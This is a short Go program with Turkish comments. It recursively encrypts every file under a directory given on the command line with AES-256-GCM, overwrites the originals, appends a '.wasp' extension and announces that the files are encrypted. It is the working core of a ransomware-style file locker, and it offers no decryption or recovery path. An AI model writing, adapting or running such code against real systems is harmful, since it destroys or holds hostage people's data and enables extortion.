package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
)

// VERİLEN DİZİNİN ALTINDAKİ HERŞEYİ AES-256 İLE ŞİFRELEYEN FONKSİYON
func makeEncrypt(path string, key []byte) error {
	err := filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			content, err := ioutil.ReadFile(filePath)
			if err != nil {
				return err
			}
			encryptedContent, err := encryptAES(content, key)
			if err != nil {
				return err
			}
			err = ioutil.WriteFile(filePath, encryptedContent, info.Mode())
			if err != nil {
				return err
			}
		}
		return nil
	})
	return err
}

// AES ŞİFRELEMESİNİN YAPILDIĞI FONKSİYON
func encryptAES(plainText []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	encryptedData := gcm.Seal(nonce, nonce, plainText, nil)
	return encryptedData, nil
}

// ŞİFRELENEN DOSYALARIN UZANTILARINI DEĞİŞTİREN FONKSİYON
func changeExtensions(path string) error {
	errr := filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			newPath := filePath + ".wasp"
			err := os.Rename(filePath, newPath)
			if err != nil {
				return err
			}
		}
		return nil
	})

	return errr
}
func main() {

	keyPtr := flag.String("key", "", "")
	dizinPtr := flag.String("dizin", "", "")
	flag.Parse()

	key := []byte(*keyPtr)
	dizin := string(*dizinPtr)
	encryptEt := makeEncrypt(dizin, key)
	if encryptEt != nil {
		fmt.Println("Dosyaları encrypt ederken hata :", encryptEt)
		return
	}

	uzantiDegistir := changeExtensions(dizin)
	if uzantiDegistir != nil {
		fmt.Println("dosyaların uzantılarını değiştirirken hata : ", uzantiDegistir)
	}

	fmt.Println("DOSYALAR ŞİFRELENDİ !")

}
